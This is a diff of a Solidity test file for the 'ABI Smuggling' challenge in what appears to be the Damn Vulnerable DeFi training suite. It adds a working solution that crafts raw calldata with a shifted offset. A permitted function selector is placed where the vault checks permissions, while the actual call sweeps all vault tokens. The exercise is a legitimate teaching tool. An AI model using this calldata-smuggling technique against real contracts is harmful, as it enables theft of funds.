@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -36,8 +36,16 @@ contract ABISmugglingChallenge is Test {
         vault = new SelfAuthorizedVault();
 
         // Set permissions in the vault
-        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
-        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+        bytes32 deployerPermission = vault.getActionId(
+            hex"85fb709d",
+            deployer,
+            address(vault)
+        );
+        bytes32 playerPermission = vault.getActionId(
+            hex"d9caed12",
+            player,
+            address(vault)
+        );
         bytes32[] memory permissions = new bytes32[](2);
         permissions[0] = deployerPermission;
         permissions[1] = playerPermission;
@@ -73,7 +81,25 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
+        // Build malicious sweep transaction to recovery account
+        bytes memory actionData = abi.encodeCall(
+            SelfAuthorizedVault.sweepFunds,
+            (recovery, IERC20(address(token)))
+        );
+
+        // Build malicious calldata
+        bytes memory data = abi.encodePacked(
+            AuthorizedExecutor.execute.selector,
+            uint256(uint160(address(vault))),
+            uint256(32*3 + 4),
+            uint256(0),
+            bytes4(0xd9caed12),
+            actionData.length,
+           actionData
+        );
         
+        // Execute malicious calldata
+        address(vault).call(data);
     }
 
     /**
@@ -82,6 +108,10 @@ contract ABISmugglingChallenge is Test {
     function _isSolved() private view {
         // All tokens taken from the vault and deposited into the designated recovery account
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 }
